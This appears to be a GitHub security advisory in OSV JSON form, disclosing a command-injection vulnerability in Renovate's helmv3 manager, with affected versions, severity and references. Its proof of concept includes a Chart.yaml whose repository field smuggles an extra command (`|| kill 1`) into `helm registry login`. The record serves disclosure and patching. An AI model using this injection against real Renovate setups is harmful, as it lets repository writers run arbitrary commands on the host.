{
  "schema_version": "1.4.0",
  "id": "GHSA-3f44-xw83-3pmg",
  "modified": "2026-01-13T20:29:12Z",
  "published": "2026-01-13T20:29:12Z",
  "aliases": [],
  "summary": "Renovate vulnerable to arbitrary command injection via helmv3 manager and malicious Chart.yaml file",
  "details": "### Summary\nThe user-provided string `repository` in the `helmv3` manager is appended to the `helm registry login` command without proper sanitization.\n\n### Details\nAdversaries can provide a maliciously crafted `Chart.yaml` in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.\nThe value for both uses of the `repository` variable in [lib/modules/manager/helmv3/common.ts](https://github.com/renovatebot/renovate/blob/b69416ce1745f67c9fc1d149738e2f52feb4f732/lib/modules/manager/helmv3/common.ts) are not being escaped using the `quote` function from the `shlex` package.\nThis lack of proper sanitization has been present in the product since version 31.51.0 (https://github.com/renovatebot/renovate/commit/f372a68144a4d78c9f7f418168e4efe03336a432), released on January 24 of 2022.\n\n### PoC\n1. Create a git repo with the following content:\n\n`renovate.json5`:\n\n```json5\n{\n  $schema: \"https://docs.renovatebot.com/renovate-schema.json\",\n  customDatasources: {\n    always: {\n      defaultRegistryUrlTemplate: \"https://docs.renovatebot.com/search/search_index.json\",\n      transformTemplates: ['{\"releases\":[{\"version\":\"99999.0.0\"}]}'],\n    },\n  },\n  // Register any credentials to make the manager attempt to use basic auth for the Helm registry\n  hostRules: [\n    {\n      matchHost: \"charts.bitnami.com\",\n      username: \"un\",\n      password: \"pw\",\n    },\n  ],\n  packageRules: [\n    {\n      // Target of the day\n      matchManagers: [\"helmv3\"],\n      // Don't consult the actual bitnami repo\n      registryUrls: [],\n      // But still, trick the manager in believing there's a new version\n      overrideDatasource: \"custom.always\",\n    },\n  ],\n}\n\n```\n\n\n`Chart.yaml`:\n\n```yaml\napiVersion: v2\nname: renovate-aci-1\nversion: 0.0.1\ndependencies:\n  - name: redis\n    version: 0.1.0\n    repository: oci://charts.bitnami.com/bitnami || kill 1\n\n```\n\n\n`Chart.lock`:\n\n```yaml\ndependencies:\n- name: redis\n  repository: oci://charts.bitnami.com/bitnami\n```\n\n2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting \"Repository finished\", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.\n\n> [!NOTE]\n> This specific proof of concept was made a lot simpler with the introduction of the `overrideDatasource` configuration since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024, because it means that there is no more need for a proper response from an actual Helm registry on the malformed repository URL.\n\n### Impact\nThis is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "renovate"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "31.51.0"
            },
            {
              "fixed": "40.33.0"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/renovatebot/renovate/security/advisories/GHSA-3f44-xw83-3pmg"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/renovatebot/renovate"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-77"
    ],
    "severity": "MODERATE",
    "github_reviewed": true,
    "github_reviewed_at": "2026-01-13T20:29:12Z",
    "nvd_published_at": null
  }
}